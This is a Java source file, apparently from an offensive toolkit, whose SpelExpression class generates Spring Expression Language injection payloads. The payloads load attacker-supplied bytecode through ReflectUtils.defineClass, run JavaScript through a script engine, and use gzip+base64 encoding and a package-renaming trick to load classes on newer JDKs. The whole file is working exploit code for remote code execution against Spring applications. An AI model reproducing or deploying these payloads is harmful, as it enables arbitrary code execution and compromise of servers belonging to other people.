package cn.butler.thirdparty.payloads.expression;

import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.thirdparty.util.GzipEncoder;
import org.apache.shiro.lang.codec.Base64;

public class SpelExpression{
    public static String spelJavaCode(String classByteName, byte[] classByteCode) {
        String base64 = Base64.encodeToString(classByteCode);
        String spelPayload = String.format("T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null)",classByteName,base64);
        return spelPayload;
    }

    public static String spelJsCode(String code){
        //Spel执行js代码必须经过这样一层处理
        code = code.replace("'", "''");
        String spelPayload = "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('"+ code +"')}";
        return spelPayload;
    };

    public static String spelJavaCodeJDKHigh(String classByteName,byte[] classByteCode) throws Exception{
        //1.设置字节码包名处于org.springframework.expression包下
        String newClassName = "org.springframework.expression." + classByteName;
        Object[] object = (Object[]) ClassHandleUtil.setClassNameForClass(classByteName, classByteCode,newClassName);
        newClassName = (String) object[0];
        classByteCode = (byte[]) object[1];
        //2.将字节码进行gzip+base64编码 或者 base64加密
        String gzipBase64 = GzipEncoder.gzipBase64Bytes(classByteCode);
        String base64 = Base64.encodeToString(classByteCode);
        //输出结果
        String spelPayload1 = String.format("T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(java.util.Base64).getDecoder().decode('%s')))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))",newClassName,gzipBase64);
        String spelPayload2 = String.format("T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(java.util.Base64).getDecoder().decode('%s'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))",newClassName,base64);
        String spelPayload = spelPayload1 + "\n" + spelPayload2;
        return spelPayload;
    }
}
